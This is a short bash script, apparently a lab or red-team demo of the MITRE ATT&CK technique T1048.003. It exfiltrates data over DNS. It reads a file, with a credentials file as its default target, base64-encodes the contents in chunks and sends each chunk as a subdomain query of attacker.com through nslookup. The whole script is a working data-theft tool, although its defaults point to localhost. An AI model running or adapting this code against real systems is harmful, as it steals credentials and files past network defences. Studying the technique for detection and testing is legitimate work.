#!/bin/bash
# T1048.003 DNS Exfiltration Client Demo
# Sends file contents as DNS subdomain queries
TARGET_FILE="${1:-/opt/sensitive-data/credentials.txt}"
DNS_SERVER="${2:-localhost}"
DNS_PORT="${3:-5353}"
DOMAIN="attacker.com"
if [ ! -f "$TARGET_FILE" ]; then echo "File not found: $TARGET_FILE"; exit 1; fi
echo "[*] Exfiltrating $TARGET_FILE via DNS to $DNS_SERVER:$DNS_PORT"
while IFS= read -r line; do
    encoded=$(echo "$line" | base64 | tr '+/' '-_' | tr -d '=\n')
    chunk_size=50
    for ((i=0; i<${#encoded}; i+=chunk_size)); do
        chunk="${encoded:$i:$chunk_size}"
        # Send DNS query with data encoded in subdomain
        echo "${chunk}.${DOMAIN}" | timeout 2 nslookup - "$DNS_SERVER" >/dev/null 2>&1 || \
        echo "[*] DNS query: ${chunk}.${DOMAIN} → $DNS_SERVER"
        sleep 0.1
    done
done < "$TARGET_FILE"
echo "[+] Exfiltration complete"
